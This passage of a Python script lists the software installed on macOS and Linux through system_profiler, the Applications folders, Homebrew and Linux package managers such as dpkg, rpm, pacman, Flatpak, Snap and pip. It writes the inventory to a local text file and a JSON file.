            logging.debug(f"Failed to parse system_profiler XML: {e}")
            # Fallback text parse
            text_output = run_command(["system_profiler", "SPApplicationsDataType"])
            if text_output:
                for line in text_output.splitlines():
                    stripped = line.strip()
                    if stripped.endswith(":"):
                        software.add(stripped[:-1])

    # 2. Standard directories scan
    app_dirs = ["/Applications", "/System/Applications", os.path.expanduser("~/Applications")]
    for d in app_dirs:
        if os.path.isdir(d):
            try:
                for entry in os.listdir(d):
                    if entry.endswith(".app"):
                        name = entry[:-4]
                        plist_path = os.path.join(d, entry, "Contents", "Info.plist")
                        version = ""
                        if os.path.isfile(plist_path):
                            # Try runningPlistBuddy or simple text check
                            pl_out = run_command(["defaults", "read", os.path.join(d, entry, "Contents", "Info"), "CFBundleShortVersionString"])
                            if pl_out:
                                version = pl_out.strip()
                        if version:
                            software.add(f"{name} {version}")
                        else:
                            software.add(name)
            except Exception:
                pass

    # 3. Homebrew packages check
    if os.path.exists("/opt/homebrew/bin/brew") or os.path.exists("/usr/local/bin/brew"):
        brew_path = "/opt/homebrew/bin/brew" if os.path.exists("/opt/homebrew/bin/brew") else "/usr/local/bin/brew"
        brew_out = run_command([brew_path, "list", "--versions"])
        if brew_out:
            for line in brew_out.strip().splitlines():
                if line.strip():
                    software.add(line.strip())

    if software:
        logging.info(f"Retrieved {len(software)} software items from macOS sources.")
    else:
        logging.warning("No software data retrieved from macOS sources.")
    return sorted(list(software))


def get_linux_software() -> list:
    software = set()

    # 1. dpkg (Debian/Ubuntu)
    if os.path.exists("/usr/bin/dpkg") or os.path.exists("/bin/dpkg"):
        output = run_command(["dpkg-query", "-W", "-f=${Package} ${Version}\n"])
        if output:
            for line in output.strip().splitlines():
                line = line.strip()
                if line:
                    software.add(line)

    # 2. rpm (RedHat/CentOS/Fedora/OpenSUSE)
    if not software and (os.path.exists("/bin/rpm") or os.path.exists("/usr/bin/rpm") or os.path.exists("/usr/bin/rpmquery")):
        output = run_command(["rpm", "-qa", "--queryformat", "%{NAME} %{VERSION}-%{RELEASE}\n"])
        if output:
            for line in output.strip().splitlines():
                line = line.strip()
                if line:
                    software.add(line)

    # 3. pacman (Arch Linux)
    if not software and os.path.exists("/usr/bin/pacman"):
        output = run_command(["pacman", "-Q"])
        if output:
            for line in output.strip().splitlines():
                line = line.strip()
                if line:
                    software.add(line)

    # 4. Flatpak
    if os.path.exists("/usr/bin/flatpak") or os.path.exists("/usr/local/bin/flatpak"):
        fp_out = run_command(["flatpak", "list", "--app", "--columns=application,version"])
        if fp_out:
            for line in fp_out.strip().splitlines():
                line = line.strip()
                if line:
                    software.add(line)

    # 5. Snap
    if os.path.exists("/usr/bin/snap") or os.path.exists("/bin/snap"):
        snap_out = run_command(["snap", "list"])
        if snap_out:
            lines = snap_out.strip().splitlines()
            for line in lines[1:]:  # skip header
                parts = line.split()
                if len(parts) >= 2:
                    software.add(f"{parts[0]} {parts[1]}")

    # 6. Python pip packages (user + system scope if accessible)
    for pip_cmd in [["pip3", "list", "--format=freeze"], ["pip", "list", "--format=freeze"]]:
        pip_out = run_command(pip_cmd)
        if pip_out:
            for line in pip_out.strip().splitlines():
                line = line.strip()
                if line:
                    software.add(f"pip:{line}")
            break

    if software:
        logging.info(f"Retrieved {len(software)} software items from Linux package managers.")
    else:
        logging.warning("No software data retrieved from any known Linux package manager.")

    return sorted(list(software))


def write_inventory_file(filename: str, software_list: list) -> None:
    logging.debug(f"Attempting to write inventory to file: {filename}")
    try:
        dir_name = os.path.dirname(filename)
        if dir_name and not os.path.exists(dir_name):
            os.makedirs(dir_name, exist_ok=True)

        with open(filename, "w", encoding="utf-8") as f:
            for item in software_list:
                f.write(f"{item}\n")
        logging.info(f"Successfully wrote {len(software_list)} items to inventory file: {filename}")
    except OSError as e:
        logging.error(f"Failed to write inventory to file '{filename}': {e}")
    except Exception as e:
        logging.error(f"Unexpected error writing to file '{filename}': {e}")

    # Also generate a structured JSON inventory file alongside txt for completeness
    try:
        base, _ = os.path.splitext(filename)
        json_filename = f"{base}.json"
        payload = {
            "platform": platform.system(),
            "release": platform.release(),
            "machine": platform.machine(),
            "count": len(software_list),
            "software": software_list,
        }
        with open(json_filename, "w", encoding="utf-8") as jf:
            json.dump(payload, jf, indent=2)
        logging.info(f"Successfully wrote structured inventory to JSON file: {json_filename}")
    except Exception as e:
        logging.debug(f"Could not write JSON inventory format: {e}")


def parse_arguments():
    parser = argparse.ArgumentParser(description="System Software Inventory Utility")
    parser.add_argument(
        "-o",
        "--output",
        default="av_inventory.txt",
        help="Path to the output inventory text file (default: av_inventory.txt)",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Enable verbose debug logging",
    )
    return parser.parse_args()


def main():
    args = parse_arguments()
    setup_logging(args.verbose)

    current_os = platform.system()
    logging.info(f"Detecting installed software on {current_os} ({platform.release()})...")

    software_list = []

    if current_os == "Windows":
        software_list = get_windows_software()
    elif current_os == "Darwin":
        software_list = get_macos_software()
    elif current_os == "Linux":
        software_list = get_linux_software()
    else:
        logging.error(f"Unsupported operating system: {current_os}")

    if software_list:
        logging.info(f"Total unique software items discovered: {len(software_list)}")
        write_inventory_file(args.output, software_list)
    else:
        logging.warning("No software items could be retrieved or the list is empty.")

    sys.exit(0)


if __name__ == "__main__":
    main()
